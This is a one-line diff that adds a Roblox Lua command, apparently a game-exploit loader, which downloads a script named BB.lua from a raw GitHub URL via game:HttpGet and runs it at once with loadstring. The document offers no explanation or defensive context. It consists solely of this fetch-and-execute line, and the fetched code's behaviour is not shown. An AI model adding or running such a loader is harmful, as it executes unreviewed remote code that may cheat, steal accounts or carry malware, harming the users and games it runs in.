@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/DraWatX/Project_01/main/BB.lua'),true))()
